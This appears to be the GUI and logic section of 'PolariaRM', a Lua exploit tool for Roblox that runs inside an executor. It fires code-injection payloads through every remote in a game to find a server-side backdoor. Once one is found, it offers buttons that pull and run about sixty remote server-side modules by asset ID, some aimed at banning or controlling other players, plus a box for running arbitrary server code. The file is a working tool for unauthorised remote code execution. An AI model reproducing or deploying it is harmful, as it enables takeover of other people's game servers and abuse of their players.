UI["ScriptsContent"]["Name"] = "ScriptsContent"
UI["ScriptsContent"]["Visible"] = false
UI["ScriptsContent"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y
UI["ScriptsContent"]["ScrollingDirection"] = Enum.ScrollingDirection.Y
UI["ScriptsContent"]["BorderSizePixel"] = 0
UI["ScriptsContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ScriptsContent"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["ScriptsContent"]["ScrollBarThickness"] = 0
UI["ScriptsContent"]["LayoutOrder"] = 3
UI["ScriptsContent"]["BackgroundTransparency"] = 1
UI["ScriptsContent"]["Parent"] = UI["Contents"]

UI["ScriptsContentGrid"] = Instance.new("UIGridLayout")
UI["ScriptsContentGrid"]["Name"] = "ScriptsContentGrid"
UI["ScriptsContentGrid"]["CellSize"] = UDim2.new(0, 102, 0, 34)
UI["ScriptsContentGrid"]["CellPadding"] = UDim2.new(0, 4, 0, 4)
UI["ScriptsContentGrid"]["Parent"] = UI["ScriptsContent"]

UI["BtnExample"] = Instance.new("TextButton")
UI["BtnExample"]["Name"] = "BtnExample"
UI["BtnExample"]["TextWrapped"] = true
UI["BtnExample"]["BorderSizePixel"] = 0
UI["BtnExample"]["TextScaled"] = true
UI["BtnExample"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["BtnExample"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["BtnExample"]["Size"] = UDim2.new(0, 32, 0, 32)
UI["BtnExample"]["Text"] = ""
UI["BtnExample"]["Parent"] = UI["ScriptsContent"]

UI["BtnExampleCorner"] = Instance.new("UICorner")
UI["BtnExampleCorner"]["Name"] = "BtnExampleCorner"
UI["BtnExampleCorner"]["CornerRadius"] = UDim.new(0, 4)
UI["BtnExampleCorner"]["Parent"] = UI["BtnExample"]

UI["BtnExampleGradient"] = Instance.new("UIGradient")
UI["BtnExampleGradient"]["Name"] = "BtnExampleGradient"
UI["BtnExampleGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["BtnExampleGradient"]["Parent"] = UI["BtnExample"]

UI["BtnExampleContainer"] = Instance.new("Frame")
UI["BtnExampleContainer"]["Name"] = "BtnExampleContainer"
UI["BtnExampleContainer"]["Interactable"] = false
UI["BtnExampleContainer"]["BorderSizePixel"] = 0
UI["BtnExampleContainer"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["BtnExampleContainer"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["BtnExampleContainer"]["BackgroundTransparency"] = 1
UI["BtnExampleContainer"]["Parent"] = UI["BtnExample"]

UI["BtnExampleLabel"] = Instance.new("TextLabel")
UI["BtnExampleLabel"]["Name"] = "BtnExampleLabel"
UI["BtnExampleLabel"]["TextWrapped"] = true
UI["BtnExampleLabel"]["BorderSizePixel"] = 0
UI["BtnExampleLabel"]["TextScaled"] = true
UI["BtnExampleLabel"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["BtnExampleLabel"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["BtnExampleLabel"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["BtnExampleLabel"]["BackgroundTransparency"] = 1
UI["BtnExampleLabel"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["BtnExampleLabel"]["Text"] = "Script name"
UI["BtnExampleLabel"]["Parent"] = UI["BtnExampleContainer"]

UI["BtnExampleLabelPadding"] = Instance.new("UIPadding")
UI["BtnExampleLabelPadding"]["Name"] = "BtnExampleLabelPadding"
UI["BtnExampleLabelPadding"]["PaddingTop"] = UDim.new(0, 6)
UI["BtnExampleLabelPadding"]["PaddingRight"] = UDim.new(0, 6)
UI["BtnExampleLabelPadding"]["PaddingLeft"] = UDim.new(0, 6)
UI["BtnExampleLabelPadding"]["PaddingBottom"] = UDim.new(0, 6)
UI["BtnExampleLabelPadding"]["Parent"] = UI["BtnExampleLabel"]

UI["CreditsContent"] = Instance.new("Frame")
UI["CreditsContent"]["Name"] = "CreditsContent"
UI["CreditsContent"]["Visible"] = false
UI["CreditsContent"]["BorderSizePixel"] = 0
UI["CreditsContent"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["CreditsContent"]["Size"] = UDim2.new(1, 0, 1, 0)
UI["CreditsContent"]["LayoutOrder"] = 5
UI["CreditsContent"]["BackgroundTransparency"] = 1
UI["CreditsContent"]["Parent"] = UI["Contents"]

UI["CreditsContentList"] = Instance.new("UIListLayout")
UI["CreditsContentList"]["Name"] = "CreditsContentList"
UI["CreditsContentList"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill
UI["CreditsContentList"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill
UI["CreditsContentList"]["Padding"] = UDim.new(0, 4)
UI["CreditsContentList"]["SortOrder"] = Enum.SortOrder.LayoutOrder
UI["CreditsContentList"]["FillDirection"] = Enum.FillDirection.Horizontal
UI["CreditsContentList"]["Parent"] = UI["CreditsContent"]

UI["DevHeadshot"] = Instance.new("ImageLabel")
UI["DevHeadshot"]["Name"] = "DevHeadshot"
UI["DevHeadshot"]["Image"] = GetAsset("PolariaRM/Assets/polaria_dev.png")
UI["DevHeadshot"]["BorderSizePixel"] = 0
UI["DevHeadshot"]["ScaleType"] = Enum.ScaleType.Fit
UI["DevHeadshot"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["DevHeadshot"]["Size"] = UDim2.new(0, 90, 0, 90)
UI["DevHeadshot"]["BackgroundTransparency"] = 1
UI["DevHeadshot"]["LayoutOrder"] = 1
UI["DevHeadshot"]["Parent"] = UI["CreditsContent"]

UI["DevHeadshotStroke"] = Instance.new("UIStroke")
UI["DevHeadshotStroke"]["Name"] = "DevHeadshotStroke"
UI["DevHeadshotStroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["DevHeadshotStroke"]["Color"] = Color3.fromRGB(255, 255, 255)
UI["DevHeadshotStroke"]["Parent"] = UI["DevHeadshot"]

UI["DevHeadshotStrokeGradient"] = Instance.new("UIGradient")
UI["DevHeadshotStrokeGradient"]["Name"] = "DevHeadshotStrokeGradient"
UI["DevHeadshotStrokeGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["DevHeadshotStrokeGradient"]["Parent"] = UI["DevHeadshotStroke"]

UI["DevHeadshotCorner"] = Instance.new("UICorner")
UI["DevHeadshotCorner"]["Name"] = "DevHeadshotCorner"
UI["DevHeadshotCorner"]["CornerRadius"] = UDim.new(1, 0)
UI["DevHeadshotCorner"]["Parent"] = UI["DevHeadshot"]

UI["DevHeadshotSC"] = Instance.new("UISizeConstraint")
UI["DevHeadshotSC"]["Name"] = "DevHeadshotSC"
UI["DevHeadshotSC"]["MinSize"] = Vector2.new(80, 80)
UI["DevHeadshotSC"]["MaxSize"] = Vector2.new(100, 100)
UI["DevHeadshotSC"]["Parent"] = UI["DevHeadshot"]

UI["DevHeadshotRatio"] = Instance.new("UIAspectRatioConstraint")
UI["DevHeadshotRatio"]["Name"] = "DevHeadshotRatio"
UI["DevHeadshotRatio"]["Parent"] = UI["DevHeadshot"]

UI["Desc"] = Instance.new("TextLabel")
UI["Desc"]["Name"] = "Desc"
UI["Desc"]["TextWrapped"] = true
UI["Desc"]["BorderSizePixel"] = 0
UI["Desc"]["TextSize"] = 20
UI["Desc"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["Desc"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["Desc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["Desc"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
UI["Desc"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["Desc"]["BackgroundTransparency"] = 1
UI["Desc"]["RichText"] = true
UI["Desc"]["Size"] = UDim2.new(0, 410, 0, 184)
UI["Desc"]["Text"] = "Fully made by JustAGuest."
UI["Desc"]["LayoutOrder"] = 2
UI["Desc"]["Position"] = UDim2.new(0, 94, 0, 54)
UI["Desc"]["Parent"] = UI["CreditsContent"]

UI["DescGradient"] = Instance.new("UIGradient")
UI["DescGradient"]["Name"] = "DescGradient"
UI["DescGradient"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))}
UI["DescGradient"]["Parent"] = UI["Desc"]

local function Dragify(DragObject, MoveObject)
    MoveObject = MoveObject or DragObject

    local dragging = false
    local dragInput
    local dragStart
    local startPos

    local function ClampPosition(newX, newY)
        local viewport = workspace.CurrentCamera.ViewportSize
        local size = MoveObject.AbsoluteSize
        local paddingX = 16
        local paddingY = 12

        local maxX = viewport.X - size.X - paddingX
        local maxY = viewport.Y - size.Y - paddingY
        local minX = paddingX
        local minY = paddingY

        newX = math.clamp(newX, minX, maxX)
        newY = math.clamp(newY, minY, maxY)

        return newX, newY
    end

    DragObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragInput = input
            dragStart = input.Position
            startPos = MoveObject.Position
        end
    end)

    DragObject.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            local newX = startPos.X.Offset + delta.X
            local newY = startPos.Y.Offset + delta.Y
            
            newX, newY = ClampPosition(newX, newY)
            
            MoveObject.Position = UDim2.new(startPos.X.Scale, newX, startPos.Y.Scale, newY)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input == dragInput then
            dragging = false
            dragInput = nil
        end
    end)
end

Dragify(UI["MainFrame"], UI["Container"])
Dragify(UI["Show"])

currentContent = UI["HomeContent"]

local function showContent(contentFrame)
    if currentContent then
        currentContent.Visible = false
    end
    contentFrame.Visible = true
    currentContent = contentFrame
end

UI["HomeTab"].MouseButton1Click:Connect(function()
    showContent(UI["HomeContent"])
end)

UI["ScanTab"].MouseButton1Click:Connect(function()
    showContent(UI["ScannerContent"])
end)

UI["ScriptsTab"].MouseButton1Click:Connect(function()
    showContent(UI["ScriptsContent"])
end)

UI["ExeTab"].MouseButton1Click:Connect(function()
    showContent(UI["ExeContent"])
end)

UI["CreditsTab"].MouseButton1Click:Connect(function()
    showContent(UI["CreditsContent"])
end)

UI["Close"].MouseButton1Click:Connect(function()
    local hideTween = Tween(UI["Container"], 0.3, {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }, "Quad", "In")
    
    hideTween:Play()
    hideTween.Completed:Wait()
    UI["ScreenGui"]:Destroy()
    Shared.PolariaRM.isLoaded = false
end)

UI["Hide"].MouseButton1Click:Connect(function()
    local hideTween = Tween(UI["Container"], 0.3, {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }, "Quad", "In")
    
    hideTween:Play()
    hideTween.Completed:Wait()
    UI["Container"].Visible = false
    UI["Show"].Visible = true
    
    UI["Show"].Size = UDim2.new(0, 0, 0, 0)
    local showTween = Tween(UI["Show"], 0.3, {
        Size = UDim2.new(0, 40, 0, 40)
    }, "Back", "Out")
    showTween:Play()
end)

UI["Show"].MouseButton1Click:Connect(function()
    UI["Show"].Visible = false
    UI["Container"].Visible = true
    
    UI["Container"].Size = UDim2.new(0, 0, 0, 0)
    local showTween = Tween(UI["Container"], 0.3, {
        Size = UDim2.new(0.7, 0, 0.9, 0)
    }, "Back", "Out")
    showTween:Play()
    
    local hideShowTween = Tween(UI["Show"], 0.3, {
        Size = UDim2.new(0, 0, 0, 0)
    }, "Quad", "In")
    hideShowTween:Play()
end)

UI["Container"].Visible = false
UI["Show"].Visible = true

coroutine.wrap(function()
    local GetThumbnail = expect("function", Players.GetUserThumbnailAsync, nil)
    if GetThumbnail then
        local success, headshot = pcall(function()
            return GetThumbnail(Players, Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
        end)
        if success and headshot then
            UI["Headshot"].Image = headshot
        end
    end
end)()

RunService.RenderStepped:Connect(function(dt)
    lastDT = dt
end)

serverStartTime = workspace:GetServerTimeNow()

local function getOS()
    local GetPlatform = expect("function", UserInputService.GetPlatform, nil)
    if GetPlatform then
        local p = GetPlatform(UserInputService)
        if p == Enum.Platform.Windows then return "Windows" end
        if p == Enum.Platform.OSX then return "macOS" end
        if p == Enum.Platform.IOS then return "iOS" end
        if p == Enum.Platform.Android then return "Android" end
    end
    return "Unknown"
end

local function updateStats()
    local fps = lastDT > 0 and math.floor(1 / lastDT) or 0

    local ping = 0
    local net = Stats:FindFirstChild("Network")
    if net then
        local item = net:FindFirstChild("ServerStatsItem")
        if item and item:FindFirstChild("Data Ping") then
            local GetValue = expect("function", item["Data Ping"].GetValue, nil)
            if GetValue then
                ping = math.floor(GetValue(item["Data Ping"]))
            end
        end
    end

    local serverAge = math.floor(workspace:GetServerTimeNow() - serverStartTime)

    local device = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and "Mobile" or "PC"
    local osName = getOS()

    local executor = "Unknown"
    
    local executorChecks = {
        {cond = expect("boolean", syn and syn.request, false), name = "Synapse X"},
        {cond = expect("boolean", KRNL_isLoaded, false), name = "KRNL"},
        {cond = expect("boolean", fluxus, false), name = "Fluxus"},
        {cond = expect("boolean", is_sirhurt_closure, false), name = "SirHurt"},
        {cond = expect("boolean", PROTOSMASHER_isLoaded, false), name = "ProtoSmasher"},
        {cond = expect("boolean", ELECTRON_isLoaded, false), name = "Electron"},
        {cond = expect("boolean", is_synapse_function, false), name = "Synapse X"},
        {cond = expect("function", identifyexecutor, nil), name = identifyexecutor and identifyexecutor() or nil},
        {cond = expect("function", getexecutorname, nil), name = getexecutorname and getexecutorname() or nil}
    }
    
    for _, check in ipairs(executorChecks) do
        if check.cond and check.name then
            executor = check.name
            break
        end
    end

    UI["HomeStats"].Text =
        "Welcome, " .. Player.DisplayName .. " (@" .. Player.Name .. ")\n" ..
        "FPS: " .. fps ..
        "\nPing: " .. ping .. "ms" ..
        "\nServer age: " .. serverAge .. "s" ..
        "\nDevice: " .. device ..
        "\nOS: " .. osName ..
        "\nExecutor: " .. executor
end

task.spawn(function()
    while UI["ScreenGui"] and UI["ScreenGui"].Parent do
        updateStats()
        task.wait(0.5)
    end
end)

local alphabet = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
}

local function generateName(lenght)
    local text = ''
    for i = 1, lenght do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote then
        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
        
        if isRemoteEvent then
            local FireServer = expect("function", remote.FireServer, nil)
            if FireServer then
                FireServer(remote, data)
            end
        elseif isRemoteFunction then
            local InvokeServer = expect("function", remote.InvokeServer, nil)
            if InvokeServer then
                spawn(function() 
                    InvokeServer(remote, data)
                end)
            end
        end
    end
end

local function findRemote()
    UI["ScanStatus"].Text = "Scanning for backdoors..."
    
    local timee = os.clock()
    local remotes = {}
    local code
    
    local GetProductInfo = expect("function", MarketplaceService and MarketplaceService.GetProductInfo, nil)
    local gameName = "Unknown Game"
    if GetProductInfo then
        local success, info = pcall(function()
            return GetProductInfo(MarketplaceService, game.PlaceId)
        end)
        if success and info then
            gameName = info.Name
        end
    end
    
    local placeId = game.PlaceId
    local PlayerName = Player.Name
    local userId = Player.UserId
    local accountAge = Player.AccountAge
    
    if ReplicatedStorage then
        local protected_backdoor = ReplicatedStorage:FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
        if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
            while true do
                code = generateName(math.random(12,30))
                if not remotes[code] then 
                    break 
                end
            end
            spawn(function() 
                local InvokeServer = expect("function", protected_backdoor.InvokeServer, nil)
                if InvokeServer then
                    InvokeServer(protected_backdoor, '.', "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                end
            end)
            remotes[code] = protected_backdoor
        end
    end
    
    for i, remote in game:GetDescendants() do
        local isRemoteEvent = expect("boolean", remote:IsA("RemoteEvent"), false)
        local isRemoteFunction = expect("boolean", remote:IsA("RemoteFunction"), false)
        
        if not isRemoteEvent and not isRemoteFunction then 
            continue 
        end
        
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if ReplicatedStorage and (remote.Parent == ReplicatedStorage or 
           remote.Parent.Parent == ReplicatedStorage or 
           remote.Parent.Parent.Parent == ReplicatedStorage) then
            
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue
            end
            
            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                continue
            end
            
            if remote.Parent and remote.Parent.Name == 'expectChatSystemChatEvents' then
                continue
            end
        end
        
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then 
                break 
            end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                runRemote(remote, "require(171016405.1884*69)")
                
                backdoorRemote = remote
                UI["ScanStatus"].Text = "Backdoor found at: " .. remote:GetFullName()
                return remote
            end
        end
        wait()
    end
    
    UI["ScanStatus"].Text = "No backdoor found"
    return false
end

UI["ScanBtn"].MouseButton1Click:Connect(function()
    findRemote()
end)

local function CreateButton(name, code)
    local newButton = UI["BtnExample"]:Clone()
    newButton.Name = name
    newButton.Visible = true
    newButton.Parent = UI["ScriptsContent"]
    
    local label = newButton:FindFirstChild("BtnExampleLabel", true)
    if label then
        label.Text = name
    end
    
    newButton.MouseButton1Click:Connect(function()
        if backdoorRemote then
            runRemote(backdoorRemote, code)
        else
            local SetCore = expect("function", StarterGui.SetCore, nil)
            if SetCore then
                SetCore(StarterGui, "SendNotification", {
                    Title = "PolariaRM (Error)",
                    Text = "No backdoor found! Scan first.",
                    Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
                    Duration = 3
                })
            end
        end
    end)
end

CreateButton("Horseman", "require(3737497650).load('" .. Player.Name .. "')")
CreateButton("The Hotline", "require(5813879549).load('" .. Player.Name .. "')")
CreateButton("Potato Man", "require(4618428149).load('" .. Player.Name .. "')")
CreateButton("Master Chief", "require(5812973403).Halo('" .. Player.Name .. "')")
CreateButton("Oculus", "require(5813695241).load('" .. Player.Name .. "')")
CreateButton("Hypercar", "require(5874393699).load('" .. Player.Name .. "')")
CreateButton("Neon Overlord", "require(5876551530).load('" .. Player.Name .. "')")
CreateButton("Clown Kidnap", "require(5591099977)('" .. Player.Name .. "')")
CreateButton("Thanos", "require(4920151387).load('" .. Player.Name .. "')")
CreateButton("The sun is a deadly lazer", "require(5751710030).Sun('" .. Player.Name .. "')")
CreateButton("Ying Yang", "require(4875966146).load('" .. Player.Name .. "')")
CreateButton("Titanium Runner", "require(5375511885).Player('" .. Player.Name .. "')")
CreateButton("Crypt", "require(5455352803).crypt('" .. Player.Name .. "')")
CreateButton("Rainbow Factory", "require(4823100870).HowRainbowsAreMade('" .. Player.Name .. "')")
CreateButton("Ares The Bladist", "require(5813806760).load('" .. Player.Name .. "')")
CreateButton("Visualizer", "require(5684993096).load('" .. Player.Name .. "')")
CreateButton("Hacker X", "require(5641200549).load('" .. Player.Name .. "')")
CreateButton("Fallen Angel", "require(4490557105).load('" .. Player.Name .. "')")
CreateButton("Dodge Charger", "require(4697572245).load('" .. Player.Name .. "')")
CreateButton("Soldier", "require(5177488826).Soldier('" .. Player.Name .. "')")
CreateButton("Grab Knife", "require(5516594078)('" .. Player.Name .. "')")
CreateButton("Pizza Guy", "require(4657036575).load('" .. Player.Name .. "')")
CreateButton("Darth Vader", "require(5441060212).load('" .. Player.Name .. "')")
CreateButton("Ban Hammer", "require(5448035802).Hammer('" .. Player.Name .. "', 'BanHammer')")
CreateButton("Crescendo", "require(4328810253).load('" .. Player.Name .. "')")
CreateButton("Hell Robotics", "require(5813792606).load('" .. Player.Name .. "')")
CreateButton("Cyber Knight", "require(5617200606).Cyber('" .. Player.Name .. "')")
CreateButton("Articulacy", "require(5730283203).Articulacy('" .. Player.Name .. "')")
CreateButton("Neptunian V", "require(4453491513).load('" .. Player.Name .. "')")
CreateButton("Obliterator", "require(5375491266).Player('" .. Player.Name .. "')")
CreateButton("Rainbow Stand", "require(5367599184).Dark('" .. Player.Name .. "')")
CreateButton("Tron Bike", "require(4021975182).load('" .. Player.Name .. "')")
CreateButton("Infinity Gauntlet", "require(5375537557).Dark('" .. Player.Name .. "')")
CreateButton("Templar", "require(5313663424).Dark('" .. Player.Name .. "')")
CreateButton("Baseball Bat", "require(4559977647).load('" .. Player.Name .. "')")
CreateButton("Dominus Venari", "require(3256686965).load('" .. Player.Name .. "')")
CreateButton("Blind Reaper", "require(4185644819).a('" .. Player.Name .. "')")
CreateButton("SCP 106", "require(4935275557):Subaru112('" .. Player.Name .. "', 'Subaru112's SCP-106')")
CreateButton("Dubstep Gun", "require(4442010059).load('" .. Player.Name .. "')")
CreateButton("Karambit", "require(5970744588).load('" .. Player.Name .. "')")
CreateButton("Infinite Yield", "require(13716575182)('" .. Player.Name .. "')")
CreateButton("Death Sheriff", "require(6056559552).load('" .. Player.Name .. "')")
CreateButton("Dominus Frigidus", "require(6054361648).load('" .. Player.Name .. "')")
CreateButton("Piano", "require(5983549520).load('" .. Player.Name .. "')")
CreateButton("Chat Control Gui", "require(5903403087).load('" .. Player.Name .. "')")
CreateButton("Echo", "require(5374597845).Dark('" .. Player.Name .. "')")
CreateButton("KFC", "require(3615713971).load('" .. Player.Name .. "')")
CreateButton("Legake Glove", "require(5187166380)('" .. Player.Name .. "')")
CreateButton("Chainsaw", "require(4560014954).load('" .. Player.Name .. "')")
CreateButton("Dark Eccentric Wrench", "require(5712519660).load('" .. Player.Name .. "')")
CreateButton("Alpha Gattling Gun", "require(5451379778).Gun('" .. Player.Name .. "')")
CreateButton("Frisk", "require(5849995364).load('" .. Player.Name .. "')")
CreateButton("Gentleman Killbot", "require(5430831931).Dark('" .. Player.Name .. "')")
CreateButton("Despacito Mech", "require(4105428725).load('" .. Player.Name .. "')")
CreateButton("Sirenhead", "require(5239955586).Dark('" .. Player.Name .. "')")
CreateButton("Lost Soul", "require(5390158029).Dark('" .. Player.Name .. "')")
CreateButton("Betty Noire", "require(5139373601).load('" .. Player.Name .. "')")
CreateButton("Hallow Slayer", "require(2675506369).hal('" .. Player.Name .. "')")
CreateButton("Skid Beater", "require(3530402272)('" .. Player.Name .. "')")
CreateButton("Chronos Sentinel", "require(3089107241).naenae('" .. Player.Name .. "')")
CreateButton("Pity Hub", "require(3253460334)('" .. Player.Name .. "')")

UI["BtnExample"]:Destroy()

UI["Exe"].MouseButton1Click:Connect(function()
    local SetCore = expect("function", StarterGui.SetCore, nil)
    if backdoorRemote and UI["InputBox"].Text ~= "" then
        runRemote(backdoorRemote, UI["InputBox"].Text)
    elseif not backdoorRemote and SetCore then
        SetCore(StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "No backdoor found! Scan first.",
            Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
            Duration = 3
        })
    end
end)

UI["Clr"].MouseButton1Click:Connect(function()
    UI["InputBox"].Text = ""
end)

UI["Re"].MouseButton1Click:Connect(function()
    local SetCore = expect("function", StarterGui.SetCore, nil)
    local success, errorMsg = pcall(function()
        if backdoorRemote then
            local TARGET_USERNAME = Player.Name
            
            local RefreshScript = [[
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Players = game:GetService("Players")
                local TARGET_USERNAME = "]] .. TARGET_USERNAME .. [["
                
                local refreshRemote
                if not ReplicatedStorage:FindFirstChild("RefreshCharacterRemote") then
                    refreshRemote = Instance.new("RemoteEvent")
                    refreshRemote.Name = "RefreshCharacterRemote"
                    refreshRemote.Parent = ReplicatedStorage
                else
                    refreshRemote = ReplicatedStorage:FindFirstChild("RefreshCharacterRemote")
                end
                
                refreshRemote.OnServerEvent:Connect(function(Player)
                    if Player.Name == TARGET_USERNAME then
                        Player:LoadCharacter()
                    end
                end)
                
                local function handleExistingPlayer(Player)
                    if Player.Name == TARGET_USERNAME then
                        task.wait(0.5)
                        Player:LoadCharacter()
                    end
                end
                
                for _, Player in ipairs(Players:GetPlayers()) do
                    handleExistingPlayer(Player)
                end
                
                Players.PlayerAdded:Connect(handleExistingPlayer)
            ]]
            
            runRemote(backdoorRemote, RefreshScript)
        elseif SetCore then
            SetCore(StarterGui, "SendNotification", {
                Title = "PolariaRM (Error)",
                Text = "No backdoor found! Scan first.",
                Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
                Duration = 3
            })
        end
    end)
    
    if not success and SetCore then
        SetCore(StarterGui, "SendNotification", {
            Title = "PolariaRM (Error)",
            Text = "Failed to execute: " .. tostring(errorMsg),
            Icon = GetAsset("PolariaRM/Assets/polaria_logo.png"),
            Duration = 3
        })
    end
end)